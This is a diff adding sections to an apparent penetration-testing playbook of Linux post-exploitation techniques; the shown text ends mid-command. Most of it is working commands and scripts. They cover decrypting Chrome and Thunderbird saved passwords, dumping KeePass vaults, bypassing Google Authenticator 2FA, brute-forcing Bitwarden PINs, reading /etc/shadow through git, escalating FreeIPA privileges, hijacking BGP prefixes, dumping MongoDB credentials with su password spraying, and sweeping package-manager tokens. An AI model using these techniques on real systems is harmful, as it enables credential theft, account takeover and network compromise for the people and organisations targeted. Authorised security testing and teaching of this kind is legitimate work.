+# DB history — targeted credential grep (passwords appear in ALTER/CREATE/GRANT/CONNECT)
+grep -hiE "password|identified by|alter user|create user|grant|connect" /home/*/.psql_history /root/.psql_history 2>/dev/null
+grep -hiE "password|identified by|alter user|create user|grant" /home/*/.mysql_history /root/.mysql_history 2>/dev/null
+grep -hiE "createUser|updateUser|auth\(" /home/*/.dbshell /root/.dbshell 2>/dev/null
+
+# Vim swap files — may contain unsaved edits of sensitive files
+find / -name "*.swp" -o -name "*.swo" 2>/dev/null | xargs ls -la 2>/dev/null
+# Recover content from swap: vim -r <FILE>.swp → :w /tmp/recovered
 
 # Config files with passwords
 find / -name "*.conf" -o -name "*.config" -o -name "*.cfg" -o -name "*.ini" -o -name "*.env" 2>/dev/null | head -50
@@ -3485,6 +6655,529 @@ ssh <USER>@<TARGET>                          # remote reuse
 
 > **Loot:** Leave the tarball as engagement loot at `/tmp/.ffprof-<USER>.tgz` for the report; do not delete original profile files on target.
 
+### 5.1hb Browser and Email-Client Credential Extraction (Chrome/Chromium + Thunderbird on Linux)
+
+Extends 5.1h (Firefox) to cover Chrome/Chromium `Login Data` SQLite extraction and Thunderbird profile looting on Linux targets.
+
+```bash
+# === Chrome / Chromium on Linux ===
+# Chrome stores credentials in an SQLite DB encrypted with a key from the OS keyring
+# On Linux without a keyring (server/headless), Chrome uses "peanut butter" as the fallback key
+
+# Locate Login Data
+find /home -name "Login Data" -path "*/.config/google-chrome/*" 2>/dev/null
+find /home -name "Login Data" -path "*/.config/chromium/*" 2>/dev/null
+ls -la /home/<USER>/.config/google-chrome/Default/Login\ Data 2>/dev/null
+ls -la /home/<USER>/.config/chromium/Default/Login\ Data 2>/dev/null
+
+# Copy to writable location (SQLite needs write access for WAL)
+cp "/home/<USER>/.config/google-chrome/Default/Login Data" /tmp/LoginData
+
+# Query saved URLs and encrypted passwords
+sqlite3 /tmp/LoginData "SELECT origin_url, username_value, hex(password_value) FROM logins;"
+```
+
+```bash
+# Decrypt on attacker (Linux Chrome uses PBKDF2 with "peanut butter" as passphrase when no keyring)
+# Key derivation: PBKDF2-SHA1("peanut butter", salt="saltysalt", iterations=1, keylen=16)
+python3 -c '
+import sqlite3, base64, hashlib
+from Crypto.Cipher import AES
+from Crypto.Protocol.KDF import PBKDF2
+
+db = sqlite3.connect("/tmp/LoginData")
+key = PBKDF2("peanut butter", b"saltysalt", dkLen=16, count=1)
+
+for url, user, enc_pass in db.execute("SELECT origin_url, username_value, password_value FROM logins"):
+    if enc_pass[:3] == b"v10" or enc_pass[:3] == b"v11":
+        iv = b" " * 16
+        cipher = AES.new(key, AES.MODE_CBC, iv)
+        decrypted = cipher.decrypt(enc_pass[3:])
+        pad_len = decrypted[-1]
+        password = decrypted[:-pad_len].decode("utf-8", errors="ignore")
+        print(f"{url} | {user} | {password}")
+'
+```
+
+```bash
+# If the system uses GNOME Keyring / KWallet (desktop), the key is in the keyring:
+secret-tool search xdg:schema chrome_libsecret_os_crypt_password_v2 2>/dev/null
+# If accessible, use that key instead of "peanut butter" for decryption
+```
+
+```bash
+# === Thunderbird (email client) ===
+# Same encryption scheme as Firefox — key4.db + logins.json
+
+# Locate Thunderbird profiles
+find /home -name "key4.db" -path "*/.thunderbird/*" 2>/dev/null
+ls -la /home/<USER>/.thunderbird/ 2>/dev/null
+cat /home/<USER>/.thunderbird/profiles.ini 2>/dev/null
+
+# Tarball and exfil (same as Firefox workflow)
+cd /home/<USER>/.thunderbird/
+tar czf /tmp/.tbprof-<USER>.tgz --exclude='*cache*' --exclude='*Cache*' --exclude='ImapMail' <PROFILE_DIR>.default-release
+
+# Decrypt offline (firefox_decrypt works on Thunderbird profiles too)
+python3 firefox_decrypt.py /tmp/loot/<THUNDERBIRD_PROFILE>
+
+# Bonus: Thunderbird stores email server passwords (IMAP/SMTP creds) — pivot to SSH/AD
+grep -r "oauth" /home/<USER>/.thunderbird/<PROFILE>/ 2>/dev/null
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# SQLite3 is often installed; extract raw hex-encoded passwords for offline cracking
+sqlite3 "/home/<USER>/.config/google-chrome/Default/Login Data" \
+  "SELECT origin_url, username_value, hex(password_value) FROM logins;" 2>/dev/null
+# If sqlite3 unavailable: copy the DB file to attacker for offline analysis
+# Thunderbird: tar the profile, decrypt on attacker with firefox_decrypt (same tool)
+```
+
+### 5.1hc KeePass Database Browsing with kpcli / keepassxc-cli (Post-Crack)
+
+After cracking a `.kdbx` master password (see 5.1b), browse the database to extract stored credentials, notes, attachments, and TOTP seeds.
+
+```bash
+# Open database with kpcli (interactive CLI browser)
+kpcli --kdb <DATABASE.kdbx>
+# Enter master password when prompted
+
+# Navigate the database
+kpcli:/> ls
+kpcli:/> cd <GROUP_NAME>
+kpcli:/GROUP_NAME> ls
+kpcli:/GROUP_NAME> show -f <ENTRY_NAME>    # -f shows password in cleartext
+kpcli:/GROUP_NAME> show -f -a <ENTRY_NAME> # -a also shows attachments
+
+# Export all entries
+kpcli:/> find .                             # list everything
+kpcli:/> show -f <ENTRY>                   # repeat for each entry
+
+# Dump all passwords at once (non-interactive)
+echo -e "open <DATABASE.kdbx>\n<MASTER_PASSWORD>\nfind .\nquit" | kpcli 2>/dev/null
+```
+
+```bash
+# Alternative: keepassxc-cli (ships with KeePassXC)
+keepassxc-cli open <DATABASE.kdbx>
+# Enter master password
+
+keepassxc-cli ls <DATABASE.kdbx>                              # list groups
+keepassxc-cli ls <DATABASE.kdbx> /<GROUP>/                    # list entries in group
+keepassxc-cli show <DATABASE.kdbx> /<GROUP>/<ENTRY>           # show entry with password
+keepassxc-cli show -s <DATABASE.kdbx> /<GROUP>/<ENTRY>        # show including TOTP seed
+
+# Export all entries to plaintext
+keepassxc-cli export <DATABASE.kdbx> --format csv > /tmp/keepass_dump.csv
+
+# Extract attachments
+keepassxc-cli attachment-export <DATABASE.kdbx> /<GROUP>/<ENTRY> <ATTACHMENT_NAME> /tmp/attachment_out
+```
+
+```bash
+# Python alternative (pykeepass)
+python3 -c '
+from pykeepass import PyKeePass
+kp = PyKeePass("<DATABASE.kdbx>", password="<MASTER_PASSWORD>")
+for entry in kp.entries:
+    print(f"{entry.group.name}/{entry.title}: {entry.username} : {entry.password}")
+    if entry.notes: print(f"  Notes: {entry.notes}")
+'
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# If no kpcli/keepassxc-cli on target, copy .kdbx to attacker and use any of the above
+# kpcli is a single Perl script — can be transferred if Perl is available on target
+```
+
+### 5.1hd GPG Decrypt Encrypted Files (Post-Crack Workflow)
+
+After cracking a GPG private key passphrase (via gpg2john + john/hashcat), import the key and decrypt `.gpg`/`.pgp`/`.asc` files to access protected data.
+
+```bash
+# Step 1: Import the recovered private key into a temporary keyring
+export GNUPGHOME=/tmp/.gpg_loot
+mkdir -p "$GNUPGHOME" && chmod 700 "$GNUPGHOME"
+gpg --import <PRIVATE_KEY_FILE>
+gpg --list-secret-keys
+
+# Step 2: Decrypt the encrypted file using the cracked passphrase
+gpg --batch --pinentry-mode loopback --passphrase '<CRACKED_PASSPHRASE>' \
+  --decrypt <ENCRYPTED_FILE.gpg> > /tmp/decrypted_output
+# Or for .asc (ASCII-armored):
+gpg --batch --pinentry-mode loopback --passphrase '<CRACKED_PASSPHRASE>' \
+  --decrypt <ENCRYPTED_FILE.asc> > /tmp/decrypted_output
+
+# Step 3: Examine decrypted content
+cat /tmp/decrypted_output
+file /tmp/decrypted_output
+```
+
+```bash
+# If the file is symmetrically encrypted (no key import needed, just passphrase)
+gpg --batch --pinentry-mode loopback --passphrase '<PASSWORD>' \
+  --decrypt <SYMMETRIC_ENCRYPTED.gpg> > /tmp/decrypted_output
+
+# Mine the decrypted content for credentials
+grep -iE "password|token|secret|key|api" /tmp/decrypted_output
+# If it's an archive:
+tar xzf /tmp/decrypted_output -C /tmp/gpg_loot/ 2>/dev/null
+unzip /tmp/decrypted_output -d /tmp/gpg_loot/ 2>/dev/null
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# gpg ships with virtually every Linux distro — fully LOTL
+# The --pinentry-mode loopback + --batch flags avoid interactive passphrase prompts
+# If --pinentry-mode is unsupported (old gpg): use gpg-agent with preset passphrase
+gpg-preset-passphrase --preset <KEYGRIP> <<< '<CRACKED_PASSPHRASE>'
+gpg --decrypt <ENCRYPTED_FILE.gpg>
+```
+
+### 5.1he Google Authenticator PAM 2FA Bypass (Backup Codes + Secret Extraction)
+
+When a Linux host uses `pam_google_authenticator.so` for SSH/sudo 2FA, the shared secret and emergency scratch codes are stored in `~/.google_authenticator`. Reading this file allows generating valid TOTP codes or using one-time backup codes.
+
+```bash
+# Detect — is Google Authenticator PAM configured?
+grep -r "pam_google_authenticator" /etc/pam.d/ 2>/dev/null
+
+# Locate the user's authenticator file
+cat /home/<USER>/.google_authenticator 2>/dev/null
+cat /root/.google_authenticator 2>/dev/null
+# Format:
+#   Line 1: Base32 secret (e.g., JBSWY3DPEHPK3PXP)
+#   Following lines: configuration options
+#   Last 5 lines: emergency scratch codes (one-time use, 8 digits each)
+```
+
+```bash
+# Method 1: Use emergency scratch codes directly
+ssh <USER>@<TARGET>
+# Password: <PASSWORD>
+# Verification code: <SCRATCH_CODE>
+
+# Method 2: Generate valid TOTP codes using the extracted secret
+oathtool --totp --base32 '<BASE32_SECRET>'
+
+# Python alternative (no oathtool needed):
+python3 -c '
+import hmac, hashlib, struct, time, base64
+secret = base64.b32decode("<BASE32_SECRET>")
+counter = int(time.time()) // 30
+msg = struct.pack(">Q", counter)
+h = hmac.new(secret, msg, hashlib.sha1).digest()
+offset = h[-1] & 0x0F
+code = (struct.unpack(">I", h[offset:offset+4])[0] & 0x7FFFFFFF) % 1000000
+print(f"{code:06d}")
+'
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# Reading .google_authenticator only requires file read access (cat)
+# Emergency scratch codes work immediately — no tool needed
+# For TOTP generation without oathtool: python3 snippet above is self-contained
+# If no python3: use the 5 scratch codes (one-time use each)
+```
+
+### 5.1hf Brotli (.br) Compressed File Decompression
+
+During loot enumeration, `.br` (Brotli-compressed) files may contain credentials, configs, or database dumps. Decompress before mining for secrets.
+
+```bash
+# Find .br files
+find / -name "*.br" -type f 2>/dev/null
+
+# Decompress with brotli CLI
+brotli --decompress <FILE.br> -o /tmp/decompressed_output
+brotli -d <FILE.br> -o /tmp/decompressed_output
+
+# Python fallback (brotli module often present with python3)
+python3 -c '
+import brotli, sys
+with open(sys.argv[1], "rb") as f:
+    data = brotli.decompress(f.read())
+with open("/tmp/decompressed_output", "wb") as f:
+    f.write(data)
+' <FILE.br>
+
+# Mine decompressed content
+grep -iE "password|token|secret|key|api" /tmp/decompressed_output
+file /tmp/decompressed_output
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# brotli CLI ships with many distros (libbrotli-dev / brotli package)
+which brotli 2>/dev/null
+# If unavailable: python3 -c 'import brotli' → if it imports, use the python approach
+# Last resort: copy .br file to attacker for decompression
+```
+
+### 5.1hg Git 'Dubious Ownership' HOME Bypass for Credential Mining
+
+Git >= 2.35.2 refuses to operate on repos owned by a different user ("dubious ownership"). When you can read another user's repo but git refuses to run log/diff/show, bypass by setting `HOME=/tmp` or adding the path to safe.directory.
+
+```bash
+# Symptom: git commands fail with "detected dubious ownership"
+cd /opt/app
+git log       # fatal: detected dubious ownership in repository at '/opt/app'
+
+# Bypass 1: Set HOME to a writable dir (fresh gitconfig, no safe.directory block)
+HOME=/tmp git log --all --oneline
+HOME=/tmp git log --all -p | grep -iE "password|secret|token|key"
+HOME=/tmp git show <COMMIT>:<FILE>
+
+# Bypass 2: Add to safe.directory
+git config --global --add safe.directory /opt/app
+git log --all --oneline
+
+# Bypass 3: GIT_CONFIG_GLOBAL pointing to /dev/null
+GIT_CONFIG_GLOBAL=/dev/null git log --all -p
+
+# Now mine the repo as normal (see 5.1i for full git history mining)
+HOME=/tmp git log --all -S "password" -p
+HOME=/tmp git stash list
+HOME=/tmp git stash show -p stash@{0}
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# The HOME=/tmp trick is pure LOTL — no tools beyond git itself
+# Alternative without git: directly parse .git/objects
+find /opt/app/.git -name "*.pack" -exec strings {} \; | grep -i "password"
+```
+
+### 5.1hh git --work-tree Override — Stage/Read Files from Outside the Repo
+
+When a git repo is writable but you need to read or stage files from a different location, `--work-tree` decouples the working directory from the `.git` directory.
+
+```bash
+# Read arbitrary files by pointing work-tree at root filesystem
+git --git-dir=/path/to/writable/.git --work-tree=/ diff HEAD -- etc/shadow
+git --git-dir=/path/to/writable/.git --work-tree=/ show HEAD:etc/shadow 2>/dev/null
+
+# Stage files from outside the repo into git's object store (for exfil)
+git --git-dir=/tmp/exfil.git --work-tree=/etc init
+git --git-dir=/tmp/exfil.git --work-tree=/etc add shadow passwd
+git --git-dir=/tmp/exfil.git --work-tree=/etc commit -m "loot"
+# Tar /tmp/exfil.git and transfer to attacker
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# Pure git — ships with the system, no external tools
+# Useful when normal file copy is blocked but git operations are allowed
+```
+
+### 5.1hi Bitwarden Browser-Extension PIN Brute-Force
+
+Bitwarden browser extension stores the vault in IndexedDB. When the user sets a PIN lock, the encryption key is derived from a 4-6 digit PIN via PBKDF2-SHA256 — brutable offline.
+
+```bash
+# Locate Bitwarden extension storage
+find /home -path "*/.config/google-chrome/Default/IndexedDB/*bitwarden*" 2>/dev/null
+find /home -path "*/.mozilla/firefox/*/storage/default/*bitwarden*" 2>/dev/null
+
+# Chrome: data is in a LevelDB directory
+ls -la "/home/<USER>/.config/google-chrome/Default/IndexedDB/chrome-extension_nngceckbapebfimnlniiiahkandclblb_0.indexeddb.leveldb/"
+
+# Copy the extension storage directory to attacker
+tar czf /tmp/.bw-loot.tgz "/home/<USER>/.config/google-chrome/Default/IndexedDB/chrome-extension_nngceckbapebfimnlniiiahkandclblb_0.indexeddb.leveldb/"
+```
+
+```bash
+# On attacker: brute-force the PIN
+# PBKDF2 with default iteration count on 4-6 digits = minutes on GPU
+hashcat -m 26800 <BW_PIN_HASH> -a 3 ?d?d?d?d          # 4-digit PIN
+hashcat -m 26800 <BW_PIN_HASH> -a 3 ?d?d?d?d?d?d      # 6-digit PIN
+
+# Extract vault JSON from LevelDB for offline analysis
+strings "/tmp/bw-loot/"*.ldb | grep -i "encrypted"
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# On target: only need to locate and copy the IndexedDB files (tar/cp)
+# All brute-force happens offline on attacker
+```
+
+### 5.1hj Forensic Recovery of Deleted Files from Raw Block Devices
+
+When disk group membership or root access grants raw block device access, recover deleted files that are no longer visible in the filesystem.
+
+```bash
+# Identify the block device
+lsblk
+ls /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
+
+# Method 1: strings — searches all blocks including deleted file content
+strings /dev/sda1 | grep -iE "password|BEGIN.*PRIVATE|secret|token|api_key" | head -50
+
+# Method 2: dd + grep (targeted offset search)
+dd if=/dev/sda1 bs=1M count=100 skip=0 2>/dev/null | strings | grep -i "password"
+
+# Method 3: debugfs (ext2/3/4 — list and recover deleted inodes)
+debugfs /dev/sda1
+# debugfs: lsdel
+# debugfs: dump <INODE> /tmp/recovered_file
+
+# Method 4: extundelete (ext3/ext4)
+extundelete /dev/sda1 --restore-all --output-dir /tmp/recovered/
+
+# Method 5: photorec (carves files by header signatures — any filesystem)
+photorec /dev/sda1
+
+# Method 6: foremost (header-based carving)
+foremost -i /dev/sda1 -o /tmp/carved/
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# strings + dd + grep are LOTL (ship with coreutils/binutils)
+strings /dev/sda1 | grep -i "password" | head -20
+# debugfs ships with e2fsprogs (present on ext4 systems)
+# For photorec/extundelete/foremost: transfer from attacker
+```
+
+### 5.1hk bmap Slack-Space Data Extraction
+
+Data can be hidden in filesystem slack space. The `bmap` tool reads slack space content after a file's logical end within its allocated block.
+
+```bash
+# Read slack space from a file
+bmap --mode slack <FILE_PATH>
+
+# Scan multiple files for non-null slack content
+find /home/<USER> -type f -exec sh -c 'slack=$(bmap --mode slack "$1" 2>/dev/null); [ -n "$slack" ] && echo "SLACK: $1" && echo "$slack"' _ {} \;
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# Without bmap: calculate slack size and read raw blocks with dd
+FILESIZE=$(stat -c %s <FILE_PATH>)
+BLOCKSIZE=$(stat -f -c %S <FILE_PATH>)
+echo "Potential slack: $((BLOCKSIZE - (FILESIZE % BLOCKSIZE))) bytes"
+# Practical extraction requires bmap or raw device access + block offset math
+# Fastest fallback: strings on the raw block device covers slack content too
+```
+
+### 5.1hl FreeIPA Realm Enumeration + Privilege Abuse
+
+FreeIPA provides centralized authentication similar to Active Directory. When a Linux host is domain-joined to a FreeIPA realm, enumerate users/groups/sudo rules for lateral movement and privilege escalation via delegated roles.
+
+```bash
+# Detect FreeIPA domain membership
+cat /etc/ipa/default.conf 2>/dev/null
+klist 2>/dev/null
+cat /etc/sssd/sssd.conf 2>/dev/null | grep -i "ipa\|domain"
+realm list 2>/dev/null
+```
+
+```bash
+# Enumerate users (requires valid Kerberos ticket)
+ipa user-find --all --raw 2>/dev/null | head -100
+ipa user-show <USERNAME> --all 2>/dev/null
+
+# Enumerate groups and memberships
+ipa group-find --all 2>/dev/null
+ipa group-show admins --all 2>/dev/null
+
+# Enumerate sudo rules
+ipa sudorule-find --all 2>/dev/null
+ipa sudorule-show <RULE_NAME> --all 2>/dev/null
+
+# Enumerate HBAC rules
+ipa hbacrule-find --all 2>/dev/null
+
+# Enumerate roles and privileges
+ipa role-find --all 2>/dev/null
+ipa privilege-find --all 2>/dev/null
+```
+
+```bash
+# Privilege escalation path: delegated role -> password reset -> group add -> sudorule
+
+# If your user has "User Administrators" or "helpdesk" role:
+ipa passwd <TARGET_USER>                        # reset another user's password
+
+# If you can modify group membership:
+ipa group-add-member admins --users=<YOUR_USER>
+
+# If you have delegation on sudorules:
+ipa sudorule-add pwn-rule --cmdcat=all --hostcat=all
+ipa sudorule-add-user pwn-rule --users=<YOUR_USER>
+# Now: sudo -i on any host in the realm
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# ipa CLI ships with freeipa-client (present on all domain-joined hosts)
+# Without ipa CLI: use ldapsearch against the IPA LDAP backend
+ldapsearch -x -H ldap://<IPA_SERVER> -b "cn=users,cn=accounts,dc=<DOMAIN>,dc=<TLD>" "(objectClass=person)" uid
+ldapsearch -x -H ldap://<IPA_SERVER> -b "cn=sudorules,cn=sudo,dc=<DOMAIN>,dc=<TLD>" "(objectClass=*)"
+```
+
+### 5.1hm BGP Prefix Hijacking via Quagga/FRR vtysh
+
+When you compromise a Linux edge router running Quagga or FRR (Free Range Routing), inject BGP route advertisements to redirect traffic through your controlled host. Relevant in lab environments simulating ISP/enterprise routing.
+
+```bash
+# Detect — is Quagga/FRR running?
+ps auxf | grep -iE "bgpd|zebra|ospfd|frr|quagga" | grep -v grep
+systemctl status frr 2>/dev/null || systemctl status quagga 2>/dev/null
+ls /etc/frr/ /etc/quagga/ 2>/dev/null
+
+# Read current BGP configuration
+vtysh -c "show running-config"
+vtysh -c "show ip bgp summary"
+vtysh -c "show ip bgp neighbors"
+vtysh -c "show ip route"
+```
+
+```bash
+# Inject a more-specific prefix to hijack traffic for a target subnet
+vtysh <<'EOF'
+configure terminal
+router bgp <LOCAL_ASN>
+ network <TARGET_PREFIX>/<MASK+1>
+ neighbor <PEER_IP> route-map HIJACK out
+!
+route-map HIJACK permit 10
+ set as-path prepend <LOCAL_ASN>
+!
+end
+write memory
+EOF
+
+# Verify advertisement
+vtysh -c "show ip bgp <TARGET_PREFIX>/<MASK+1>"
+vtysh -c "show ip bgp neighbors <PEER_IP> advertised-routes"
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# vtysh ships with FRR/Quagga — it IS the management tool for the routing daemon
+# No external tools needed; vtysh is the LOTL interface to BGP
+# If vtysh requires a password: check /etc/frr/vtysh.conf or /etc/quagga/vtysh.conf
+cat /etc/frr/vtysh.conf 2>/dev/null
+```
+
 ### 5.1i Local Git History Mining (Post-Foothold)
 
 Developers commit secrets, then revert or delete the file — git history retains them. Mine local `.git` directories for keys hidden in old commits, stashes, reflog, and dangling blobs.
@@ -3590,6 +7283,331 @@ git show <COMMIT_HASH>:<FILE_PATH>
 > **Tip:** Even after `git rm` + commit + `git gc`, secrets persist in pack files until objects expire. `git fsck --unreachable` plus `git cat-file -p` pulls them back regardless.
 
 > **Tip:** Bare repos on servers (`/srv/git/*.git`, `/opt/gitea/`, `/var/lib/gitlab/`) hold the same history — same techniques apply, just `cd` into the bare repo directory directly.
+
+### 5.1j MongoDB Local Shell Post-Foothold Credential Extraction
+
+When MongoDB is bound to localhost without authentication (common default), connect via the mongo shell and enumerate databases for plaintext credentials, API keys, and password hashes that enable lateral movement or privilege escalation.
+
+```bash
+# Detect — is MongoDB running locally without auth?
+ss -tlnp | grep -E "27017|27018|mongod"
+ps auxf | grep mongod | grep -v grep
+# Check if auth is disabled (default on many installs)
+grep -E "auth|authorization" /etc/mongod.conf /etc/mongodb.conf 2>/dev/null
+# If authorization: disabled (or absent) → no auth needed
+```
+
+```bash
+# Connect and enumerate
+mongo --quiet --eval "db.adminCommand('listDatabases')"
+# Or with mongosh (newer versions):
+mongosh --quiet --eval "db.adminCommand('listDatabases')"
+
+# Enumerate all databases and collections
+mongo --quiet <<'MONGOEOF'
+var dbs = db.adminCommand('listDatabases').databases;
+dbs.forEach(function(d) {
+  var conn = db.getSiblingDB(d.name);
+  print("\n=== " + d.name + " ===");
+  conn.getCollectionNames().forEach(function(c) {
+    print("  " + c + " (" + conn.getCollection(c).count() + " docs)");
+  });
+});
+MONGOEOF
+```
+
+```bash
+# Hunt for credentials in common collection names
+mongo --quiet <<'MONGOEOF'
+var targets = ['users', 'accounts', 'credentials', 'admins', 'auth', 'sessions', 'tokens', 'apikeys', 'config'];
+var dbs = db.adminCommand('listDatabases').databases;
+dbs.forEach(function(d) {
+  var conn = db.getSiblingDB(d.name);
+  conn.getCollectionNames().forEach(function(c) {
+    if (targets.some(function(t) { return c.toLowerCase().indexOf(t) >= 0; })) {
+      print("\n[!] " + d.name + "." + c);
+      conn.getCollection(c).find().limit(10).forEach(printjson);
+    }
+  });
+});
+MONGOEOF
+
+# Direct credential extraction from common patterns
+mongo --quiet --eval 'db.getSiblingDB("<DB_NAME>").users.find({}, {username:1, password:1, email:1})'
+mongo --quiet --eval 'db.getSiblingDB("admin").system.users.find()'   # MongoDB internal users
+```
+
+```bash
+# Password reuse check — try extracted creds against system accounts
+# Extract unique passwords/hashes
+mongo --quiet --eval 'db.getSiblingDB("<DB_NAME>").users.find({},{password:1,_id:0})' | \
+  grep -oP '"password"\s*:\s*"\K[^"]+' | sort -u > /tmp/mongo_passwords.txt
+
+# Try against local users via su
+while IFS= read -r pass; do
+  echo "$pass" | timeout 2 su - <TARGET_USER> -c whoami 2>/dev/null && echo "[+] $pass works"
+done < /tmp/mongo_passwords.txt
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# mongo/mongosh client is present on any system running MongoDB
+which mongo mongosh 2>/dev/null
+# If mongo client is missing but Python3 is available:
+python3 -c "
+import socket, struct
+# MongoDB wire protocol — send isMaster command
+s = socket.socket()
+s.connect(('127.0.0.1', 27017))
+msg = b'\x3f\x00\x00\x00'  # message length
+msg += b'\x01\x00\x00\x00'  # requestID
+msg += b'\x00\x00\x00\x00'  # responseTo
+msg += b'\xd4\x07\x00\x00'  # opCode: OP_QUERY
+msg += b'\x00\x00\x00\x00'  # flags
+msg += b'admin.\$cmd\x00'   # collection
+msg += b'\x00\x00\x00\x00'  # skip
+msg += b'\x01\x00\x00\x00'  # return
+# Minimal isMaster BSON document
+import bson  # may not be available — fallback to mongo client
+"
+# Realistically: if MongoDB is installed, the mongo shell is the LOTL tool
+```
+
+### 5.1k Recovering Secrets from ~/.viminfo (Registers, File Marks, Search History)
+
+Vim stores command history, search patterns, yanked text (registers), and file marks in `~/.viminfo`. Administrators who edit sensitive files leave credential fragments in registers and the file-mark history reveals which config files they accessed.
+
+```bash
+# Find all viminfo files
+find / -name ".viminfo" 2>/dev/null
+ls -la /home/*/.viminfo /root/.viminfo 2>/dev/null
+
+# Dump registers (yanked/deleted text — may contain passwords pasted into configs)
+grep -A5 "^\"" /root/.viminfo 2>/dev/null
+grep -A5 "^\"" /home/*/.viminfo 2>/dev/null
+
+# Search for high-value patterns in register contents
+grep -iE "password|secret|token|key|api|BEGIN.*PRIVATE" /root/.viminfo 2>/dev/null
+grep -iE "password|secret|token|key|api|BEGIN.*PRIVATE" /home/*/.viminfo 2>/dev/null
+```
+
+```bash
+# Command-line history — shows what commands were run in vim
+grep "^:" /root/.viminfo 2>/dev/null | head -50
+# Look for: :r !cat /etc/shadow, :w /tmp/creds, :%s/oldpass/newpass/g
+
+# Search history — reveals what was searched for (grep patterns)
+grep "^/" /root/.viminfo 2>/dev/null | head -20
+grep "^?" /root/.viminfo 2>/dev/null | head -20
+
+# File marks — shows recently edited files (high-value targets)
+grep "^>" /root/.viminfo 2>/dev/null | head -20
+# Example: > ~/.ssh/config, > /etc/openvpn/auth.txt, > /opt/app/.env
+
+# Named registers (a-z) — explicitly yanked text
+sed -n '/^"[a-z]/,/^$/p' /root/.viminfo 2>/dev/null
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# Only cat/grep needed — viminfo is a plain text file
+# One-liner to extract all register contents and high-value strings:
+for f in /home/*/.viminfo /root/.viminfo; do
+  [ -r "$f" ] && echo "=== $f ===" && grep -iE "password|secret|token|BEGIN|key=" "$f"
+done
+```
+
+### 5.1l Package-Manager Dotfile Credential Discovery
+
+Package-manager auth tokens live in dotfiles that persist after `npm publish`, `pip upload`, `gem push`, etc. A sweep of home directories reveals tokens for PyPI, npm, RubyGems, Cargo, Composer, Maven, and Gradle registries.
+
+```bash
+# One-shot sweep of all package-manager credential dotfiles
+for home in /home/* /root; do
+  for f in .npmrc .yarnrc .pypirc .netrc .gem/credentials .bundle/config \
+           .cargo/credentials .cargo/credentials.toml .composer/auth.json \
+           .m2/settings.xml .gradle/gradle.properties .docker/config.json \
+           .config/pip/pip.conf; do
+    [ -r "$home/$f" ] && echo "[+] $home/$f" && cat "$home/$f"
+  done
+done 2>/dev/null
+```
+
+```bash
+# What tokens look like in each file:
+
+# .npmrc — //registry.npmjs.org/:_authToken=npm_XXXXXXXXXXXX
+grep -i "authToken\|_auth\|registry" /home/*/.npmrc /root/.npmrc 2>/dev/null
+
+# .pypirc — password = pypi-XXXXXXXXXXXX (or plaintext password)
+grep -iE "password|token|username" /home/*/.pypirc /root/.pypirc 2>/dev/null
+
+# .netrc — machine <host> login <user> password <pass>
+cat /home/*/.netrc /root/.netrc 2>/dev/null
+
+# .gem/credentials — :rubygems_api_key: rubygems_XXXX
+cat /home/*/.gem/credentials /root/.gem/credentials 2>/dev/null
+
+# .bundle/config — BUNDLE_ENTERPRISE__CONTRIBSYS__COM: "user:pass"
+cat /home/*/.bundle/config /root/.bundle/config 2>/dev/null
+
+# .cargo/credentials[.toml] — token = "cio_XXXXX"
+cat /home/*/.cargo/credentials /home/*/.cargo/credentials.toml 2>/dev/null
+
+# .composer/auth.json — {"http-basic": {"repo.packagist.com": {"username":"x","password":"y"}}}
+cat /home/*/.composer/auth.json /root/.composer/auth.json 2>/dev/null
+
+# .m2/settings.xml — <password>PLAINTEXT_OR_ENCRYPTED</password>
+grep -iE "password|passphrase" /home/*/.m2/settings.xml /root/.m2/settings.xml 2>/dev/null
+
+# .gradle/gradle.properties — mavenUser=x / mavenPassword=y / signing.password=z
+grep -iE "password|token|key" /home/*/.gradle/gradle.properties /root/.gradle/gradle.properties 2>/dev/null
+
+# .docker/config.json — {"auths":{"registry":{"auth":"base64(user:pass)"}}}
+cat /home/*/.docker/config.json /root/.docker/config.json 2>/dev/null | grep -i auth
+# Decode docker auth: echo "<BASE64>" | base64 -d
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# Pure cat/grep/for loop — fully LOTL, no tools needed
+# The one-shot sweep above works with only bash builtins + cat
+# Decode base64 docker auth without external tools:
+# echo "<TOKEN>" | base64 -d (base64 is coreutils)
+```
+
+### 5.1m Post-Exploitation SQLite Database Enumeration and Abuse
+
+SQLite databases (`.db`, `.sqlite`, `.sqlite3`) are ubiquitous for application state, local auth stores, browser profiles, and internal APIs. After gaining access, enumerate all SQLite files, dump credential tables, and check for writable task/job databases that enable privilege escalation.
+
+```bash
+# Find all SQLite databases
+find / -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" -o -name "*.sqlitedb" 2>/dev/null | head -30
+# Common locations:
+ls -la /var/www/*/db.sqlite3 /opt/*/data/*.db /var/lib/*/*.sqlite 2>/dev/null
+
+# Verify it's SQLite (file magic)
+file <DATABASE_PATH>
+```
+
+```bash
+# Enumerate tables and schema
+sqlite3 <DATABASE_PATH> ".tables"
+sqlite3 <DATABASE_PATH> ".schema"
+
+# Dump credential-bearing tables
+sqlite3 <DATABASE_PATH> "SELECT * FROM users;" 2>/dev/null
+sqlite3 <DATABASE_PATH> "SELECT * FROM accounts;" 2>/dev/null
+sqlite3 <DATABASE_PATH> "SELECT * FROM auth_user;" 2>/dev/null   # Django default
+sqlite3 <DATABASE_PATH> "SELECT * FROM credentials;" 2>/dev/null
+sqlite3 <DATABASE_PATH> "SELECT * FROM sessions;" 2>/dev/null
+sqlite3 <DATABASE_PATH> "SELECT * FROM tokens;" 2>/dev/null
+
+# Generic credential hunt across all tables
+sqlite3 <DATABASE_PATH> <<'SQL'
+.headers on
+.mode column
